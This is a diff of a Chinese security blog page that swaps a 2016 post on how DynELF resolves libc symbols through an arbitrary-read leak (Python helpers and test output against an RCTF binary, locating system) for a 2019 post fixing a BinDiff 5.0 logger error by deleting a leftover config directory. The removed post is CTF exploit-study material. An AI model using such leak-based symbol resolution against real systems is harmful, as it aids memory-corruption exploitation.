@@ -3,20 +3,20 @@
 <head><meta name="generator" content="Hexo 3.8.0">
   <meta charset="utf-8">
   
-  <title>what DynELF does basically | o0xmuhe&#39;s blog</title>
+  <title>Bindiff5.0 Could not create file handler fix | o0xmuhe&#39;s blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="0x00:一直很好奇DynELF是怎么去info leak的，在阅读完了老外的一篇文章后，自己也仿照这写了一个，顺便复习了下elf文件结构相关的知识。">
-<meta name="keywords" content="pwn,python">
+  <meta name="description" content="0x00 : 问题升级Mojave后(这事儿Mojave不背锅)， bindiff5.0 工作一直有问题： Failed to initalize file logger. Could not create file handler">
+<meta name="keywords" content="IDA,Bindiff">
 <meta property="og:type" content="article">
-<meta property="og:title" content="what DynELF does basically">
-<meta property="og:url" content="http://o0xmuhe.me/2016/12/24/what-DynELF-does-basically/index.html">
+<meta property="og:title" content="Bindiff5.0 Could not create file handler fix">
+<meta property="og:url" content="http://o0xmuhe.me/2019/08/22/Bindiff5-0-Could-not-create-file-handler-fix/index.html">
 <meta property="og:site_name" content="o0xmuhe&#39;s blog">
-<meta property="og:description" content="0x00:一直很好奇DynELF是怎么去info leak的，在阅读完了老外的一篇文章后，自己也仿照这写了一个，顺便复习了下elf文件结构相关的知识。">
+<meta property="og:description" content="0x00 : 问题升级Mojave后(这事儿Mojave不背锅)， bindiff5.0 工作一直有问题： Failed to initalize file logger. Could not create file handler">
 <meta property="og:locale" content="default">
-<meta property="og:updated_time" content="2017-01-02T13:32:55.000Z">
+<meta property="og:updated_time" content="2019-08-22T03:00:50.439Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="what DynELF does basically">
-<meta name="twitter:description" content="0x00:一直很好奇DynELF是怎么去info leak的，在阅读完了老外的一篇文章后，自己也仿照这写了一个，顺便复习了下elf文件结构相关的知识。">
+<meta name="twitter:title" content="Bindiff5.0 Could not create file handler fix">
+<meta name="twitter:description" content="0x00 : 问题升级Mojave后(这事儿Mojave不背锅)， bindiff5.0 工作一直有问题： Failed to initalize file logger. Could not create file handler">
   
     <link rel="alternative" href="/atom.xml" title="o0xmuhe&#39;s blog" type="application/atom+xml">
   
@@ -290,11 +290,11 @@
         </header>                
     </div>
 </nav>
-      <div class="body-wrap"><article id="post-what-DynELF-does-basically" class="article article-type-post" itemscope="" itemprop="blogPost">
+      <div class="body-wrap"><article id="post-Bindiff5-0-Could-not-create-file-handler-fix" class="article article-type-post" itemscope="" itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2016/12/24/what-DynELF-does-basically/" class="article-date">
-      <time datetime="2016-12-23T17:14:30.000Z" itemprop="datePublished">2016-12-24</time>
+      <a href="/2019/08/22/Bindiff5-0-Could-not-create-file-handler-fix/" class="article-date">
+      <time datetime="2019-08-22T02:54:40.000Z" itemprop="datePublished">2019-08-22</time>
 </a>
     </div>
   
@@ -307,7 +307,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      what DynELF does basically
+      Bindiff5.0 Could not create file handler fix
     </h1>
   
 
@@ -318,7 +318,7 @@
 
         
     <div class="article-tag tagcloud">
-        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/">pwn</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/python/">python</a></li></ul>
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Bindiff/">Bindiff</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/IDA/">IDA</a></li></ul>
     </div>
 
         <div class="clearfix"></div>
@@ -328,21 +328,20 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <h4 id="0x00"><a href="#0x00" class="headerlink" title="0x00:"></a>0x00:</h4><p>一直很好奇DynELF是怎么去info leak的，在阅读完了老外的一篇文章后，自己也仿照这写了一个，顺便复习了下elf文件结构相关的知识。<br><a id="more"></a></p>
-<h4 id="0x01-Get-elf-base-addr"><a href="#0x01-Get-elf-base-addr" class="headerlink" title="0x01: Get elf base addr"></a>0x01: Get elf base addr</h4><pre><code>前提：假设现在已经有一个任意地址读的漏洞，可以写出一个leak函数供后面代码使用。
-</code></pre><p>首先，我们需要从一个地址开始，先解析到<code>elf base addr</code>。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_elf_base</span><span class="params">(entry)</span>:</span></span><br><span class="line">    entry = u64(entry)</span><br><span class="line">    libc_base = entry &amp; <span class="number">0xfffffffffffff000</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        tmp = leak(libc_base,<span class="number">0x8</span>)</span><br><span class="line">        <span class="keyword">if</span> tmp[<span class="number">0</span>:<span class="number">4</span>] == <span class="string">'\x7fELF'</span></span><br><span class="line">        	<span class="keyword">break</span></span><br><span class="line">        libc_base -= <span class="number">0x1000</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">'[+]Libc base : 0x%x'</span> % (libc_base)</span><br><span class="line">    <span class="keyword">return</span> libc_base</span><br></pre></td></tr></table></figure>
-<h4 id="0x02-find-program-header"><a href="#0x02-find-program-header" class="headerlink" title="0x02: find program header"></a>0x02: find program header</h4><p>之后是找到程序头。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">findPhdr</span><span class="params">(addr)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> bits == <span class="number">32</span>:</span><br><span class="line">        e_phoff = u32(leak(addr+<span class="number">0x1c</span>,<span class="number">0x4</span>).ljust(<span class="number">4</span>,<span class="string">'\0'</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        e_phoff = u64(leak(addr+<span class="number">0x20</span>,<span class="number">0x8</span>).ljust(<span class="number">8</span>,<span class="string">'\0'</span>))</span><br><span class="line">    <span class="keyword">return</span> e_phoff + addr</span><br></pre></td></tr></table></figure>
-<h4 id="0x03-DYNAMIC-Section"><a href="#0x03-DYNAMIC-Section" class="headerlink" title="0x03: DYNAMIC Section"></a>0x03: DYNAMIC Section</h4><p>有了之前的程序头，就可以根据elf文件结构，去找到<code>DYNAMIC section</code>了</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">findDynamic</span><span class="params">(Phaddr,elf_base)</span>:</span></span><br><span class="line">    i = <span class="number">-56</span></span><br><span class="line">    p_type = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> p_type != <span class="number">2</span>:</span><br><span class="line">        i += <span class="number">56</span></span><br><span class="line">        p_type = u32(leak,(Phaddr+i,<span class="number">0x4</span>))</span><br><span class="line">    <span class="keyword">return</span> u64(leak(Phaddr+i+<span class="number">16</span>,<span class="number">0x8</span>)) + elf_base</span><br></pre></td></tr></table></figure>
-<h4 id="0x04-DT-SYMTAB-and-DT-STRTAB"><a href="#0x04-DT-SYMTAB-and-DT-STRTAB" class="headerlink" title="0x04: DT_SYMTAB and DT_STRTAB"></a>0x04: DT_SYMTAB and DT_STRTAB</h4><p>根据上一步找到的<code>DYNAMIC section</code>，可以确定<code>DT_STRTAB</code>和 <code>DT_SYMTAB</code>。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">findDynTable</span><span class="params">(DynamicAddr)</span>:</span></span><br><span class="line">    <span class="comment"># for DT_STRTAB -- 5</span></span><br><span class="line">    <span class="comment"># for DT_SYMTAB -- 6</span></span><br><span class="line">    tmp_dyn = DynamicAddr</span><br><span class="line">    dt_sym_addr = <span class="number">0</span></span><br><span class="line">    dt_str_addr = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        garbage = u64(leak(tmp_dyn,<span class="number">0x8</span>))</span><br><span class="line">        <span class="keyword">if</span> garbage == <span class="number">0x5</span>:</span><br><span class="line">            dt_str_addr = u64(leak(tmp_dyn+<span class="number">0x8</span>,<span class="number">0x8</span>))</span><br><span class="line">        <span class="keyword">elif</span> garbage == <span class="number">0x6</span>:</span><br><span class="line">            dt_sym_addr = u64(leak(tmp_dyn+<span class="number">0x8</span>,<span class="number">0x8</span>))</span><br><span class="line">        <span class="keyword">if</span> dt_sym_addr <span class="keyword">and</span> dt_str_addr:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        tmp_dyn += <span class="number">0x10</span></span><br><span class="line">    <span class="keyword">return</span> (dt_sym_addr,dt_str_addr)</span><br></pre></td></tr></table></figure>
-<h4 id="0x05-find-symbol-you-want"><a href="#0x05-find-symbol-you-want" class="headerlink" title="0x05: find symbol you want"></a>0x05: find symbol you want</h4><p>最后一步，查找目标函数。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">findSymbol</span><span class="params">(strtab,symtab,symbol,elf_base)</span>:</span></span><br><span class="line">    tmp_sym = symtab</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        garbage = u32(leak(tmp_sym,<span class="number">0x4</span>))</span><br><span class="line">        name = leak(strtab+garbage,len(symbol))</span><br><span class="line">        <span class="keyword">if</span> name == symbol:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        tmp_sym += <span class="number">0x18</span></span><br><span class="line">    symbol_addr = u64(leak(tmp_sym+<span class="number">0x8</span>,<span class="number">0x8</span>)) + elf_base</span><br><span class="line">    <span class="keyword">return</span> symbol_addr</span><br></pre></td></tr></table></figure>
-<h4 id="0x06-Test"><a href="#0x06-Test" class="headerlink" title="0x06: Test"></a>0x06: Test</h4><p>最后看一下效果<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># muhe @ ubuntu in ~/Desktop/leak_study [20:58:04] </span><br><span class="line">$ python leak.py </span><br><span class="line">[+] Starting local process &apos;./pwn200&apos;: Done</span><br><span class="line">[+]Libc base : 0x7f95453ef000</span><br><span class="line">[+]Libc Program header addr : 0x7f95453ef040</span><br><span class="line">[+]Dynamic addr : 0x7f95457b1ba0</span><br><span class="line">[+]DT_SYMTAB_Addr 0x7f95453f2d80</span><br><span class="line">[+]DT_STRTAB_Addr 0x7f95453ffff8</span><br><span class="line">[+]System addr : 0x7f9545434390</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">Welcome to RCTF</span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAA\x9@$ </span><br><span class="line"></span><br><span class="line">[*] Got EOF while reading in interactive</span><br></pre></td></tr></table></figure></p>
-<h4 id="0x07"><a href="#0x07" class="headerlink" title="0x07:"></a>0x07:</h4><p>完整代码丢到了<a href="https://github.com/o0xmuhe/PwnableLog" target="_blank" rel="noopener">自己的pwnlog</a>去了。<br>说句题外话-。-  在看这篇<a href="http://uaf.io/exploitation/misc/2016/04/02/Finding-Functions.html" target="_blank" rel="noopener">Finding-Functions</a>的时候，问了作者几个问题，作者都很快回复而且还给了不少其他的建议-。- 人真的很nice。</p>
-<h4 id="0x08-Reference"><a href="#0x08-Reference" class="headerlink" title="0x08: Reference"></a>0x08: Reference</h4><p><a href="http://uaf.io/exploitation/misc/2016/04/02/Finding-Functions.html" target="_blank" rel="noopener">Finding-Functions</a></p>
+        <h2 id="0x00-问题"><a href="#0x00-问题" class="headerlink" title="0x00 : 问题"></a>0x00 : 问题</h2><p>升级Mojave后(这事儿Mojave不背锅)， bindiff5.0 工作一直有问题：</p>
+<p><code>Failed to initalize file logger. Could not create file handler</code></p>
+<a id="more"></a>
+<p>今天总算搞定了这个问题，记录一下过程。</p>
+<h2 id="0x01-尝试过程"><a href="#0x01-尝试过程" class="headerlink" title="0x01 : 尝试过程"></a>0x01 : 尝试过程</h2><ol>
+<li>重装ida 和 bindiff。 ❌</li>
+<li>Java环境问题？ ❌</li>
+</ol>
+<p>后来发现是日志文件的问题，正常情况下，你的日志是在:</p>
+<p><code>/Users/YOUR_USER_NAME/Library/Application Support/.bindiff</code></p>
+<p>有意思的情况是，如果你之前装过其他版本的bindiff，<strong>卸载后这个目录并不会被删除</strong>，这就导致了后面高版本bindiff出现一开始的问题。笔者就是之前用ida6.8，配合bindiff4.3，所以出现了这个问题。</p>
+<h2 id="0x02-解决方案"><a href="#0x02-解决方案" class="headerlink" title="0x02 : 解决方案"></a>0x02 : 解决方案</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo rm -rf /Users/YOUR_USER_NAME/Library/Application Support/.bindiff</span><br></pre></td></tr></table></figure>
+<p>重新安装bindiff5.0</p>
+<p>问题解决！happy diff， happy bug hunting！</p>
 
       
     </div>
@@ -351,13 +350,13 @@
   
     
     <div class="copyright">
-        <p><span>本文标题:</span><a href="/2016/12/24/what-DynELF-does-basically/">what DynELF does basically</a></p>
+        <p><span>本文标题:</span><a href="/2019/08/22/Bindiff5-0-Could-not-create-file-handler-fix/">Bindiff5.0 Could not create file handler fix</a></p>
         <p><span>文章作者:</span><a href="/" title="访问 muhe 的个人博客">muhe</a></p>
-        <p><span>发布时间:</span>2016年12月24日 - 01时14分</p>
-        <p><span>最后更新:</span>2017年01月02日 - 21时32分</p>
+        <p><span>发布时间:</span>2019年08月22日 - 10时54分</p>
+        <p><span>最后更新:</span>2019年08月22日 - 11时00分</p>
         <p>
-            <span>原始链接:</span><a class="post-url" href="/2016/12/24/what-DynELF-does-basically/" title="what DynELF does basically">http://o0xmuhe.me/2016/12/24/what-DynELF-does-basically/</a>
-            <span class="copy-path" data-clipboard-text="原文: http://o0xmuhe.me/2016/12/24/what-DynELF-does-basically/　　作者: muhe" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <span>原始链接:</span><a class="post-url" href="/2019/08/22/Bindiff5-0-Could-not-create-file-handler-fix/" title="Bindiff5.0 Could not create file handler fix">http://o0xmuhe.me/2019/08/22/Bindiff5-0-Could-not-create-file-handler-fix/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://o0xmuhe.me/2019/08/22/Bindiff5-0-Could-not-create-file-handler-fix/　　作者: muhe" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
             <script src="/js/clipboard.min.js"></script>
             <script> var clipboard = new Clipboard('.copy-path'); </script>
         </p>
@@ -370,18 +369,9 @@
 
 <nav id="article-nav">
   
-    <a href="/2017/01/19/Windows-Kernel-Exploit-Study-1/" id="article-nav-newer" class="article-nav-link-wrap">
-      <strong class="article-nav-caption"><</strong>
-      <div class="article-nav-title">
-        
-          Windows Kernel Exploit Study(1)
-        
-      </div>
-    </a>
   
-  
-    <a href="/2016/12/17/fuzzing-with-peach-Just-a-toy/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">fuzzing with peach(Just a toy)</div>
+    <a href="/2019/08/20/macOS-IPC-Study-basic/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">macOS IPC Study basic</div>
       <strong class="article-nav-caption">></strong>
     </a>
   
@@ -392,7 +382,7 @@
 
     <div id="toc" class="toc-article">
     <strong class="toc-title">文章目录</strong>
-    <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#0x00"><span class="toc-number">1.</span> <span class="toc-text">0x00:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x01-Get-elf-base-addr"><span class="toc-number">2.</span> <span class="toc-text">0x01: Get elf base addr</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x02-find-program-header"><span class="toc-number">3.</span> <span class="toc-text">0x02: find program header</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x03-DYNAMIC-Section"><span class="toc-number">4.</span> <span class="toc-text">0x03: DYNAMIC Section</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x04-DT-SYMTAB-and-DT-STRTAB"><span class="toc-number">5.</span> <span class="toc-text">0x04: DT_SYMTAB and DT_STRTAB</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x05-find-symbol-you-want"><span class="toc-number">6.</span> <span class="toc-text">0x05: find symbol you want</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x06-Test"><span class="toc-number">7.</span> <span class="toc-text">0x06: Test</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x07"><span class="toc-number">8.</span> <span class="toc-text">0x07:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x08-Reference"><span class="toc-number">9.</span> <span class="toc-text">0x08: Reference</span></a></li></ol>
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-问题"><span class="toc-number">1.</span> <span class="toc-text">0x00 : 问题</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-尝试过程"><span class="toc-number">2.</span> <span class="toc-text">0x01 : 尝试过程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-解决方案"><span class="toc-number">3.</span> <span class="toc-text">0x02 : 解决方案</span></a></li></ol>
 </div>
 <input type="button" id="tocButton" value="隐藏目录" title="点击按钮隐藏或者显示文章目录">
 
@@ -459,13 +449,11 @@
 
     <div class="scroll" id="post-nav-button">
         
-            <a href="/2017/01/19/Windows-Kernel-Exploit-Study-1/" title="上一篇: Windows Kernel Exploit Study(1)">
-                <i class="fa fa-angle-left"></i>
-            </a>
+            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
         
         <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
         
-            <a href="/2016/12/17/fuzzing-with-peach-Just-a-toy/" title="下一篇: fuzzing with peach(Just a toy)">
+            <a href="/2019/08/20/macOS-IPC-Study-basic/" title="下一篇: macOS IPC Study basic">
                 <i class="fa fa-angle-right"></i>
             </a>
         
